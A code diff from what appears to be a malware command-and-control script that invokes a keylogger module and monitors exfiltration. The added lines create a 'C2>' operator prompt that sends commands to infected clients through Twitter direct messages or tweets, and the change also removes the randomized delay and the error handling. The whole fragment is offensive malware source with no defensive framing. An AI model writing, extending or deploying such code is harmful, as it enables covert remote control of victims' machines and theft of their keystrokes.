@@ -189,10 +189,14 @@ def keylogger_stop(args):
     while True:
         try:
             invoke_module("keylogger_start")  # Test module
+            cmd = input("C2> ")
+            if cmd.startswith("target:"):
+                target_id, cmd = cmd.split(":", 1)[1].split(" ", 1)
+                send_dm_command(clients[target_id]["handle"], cmd.strip())
+            else:
+                send_tweet_command(cmd.strip())
             monitor_exfiltration()
-            time.sleep(random.randint(30, 300))
-        except Exception as e:
-            logger.error(f"Main loop error: {e}")
+            time.sleep(10)  # Wait for responses
 
 if __name__ == "__main__":
     main()
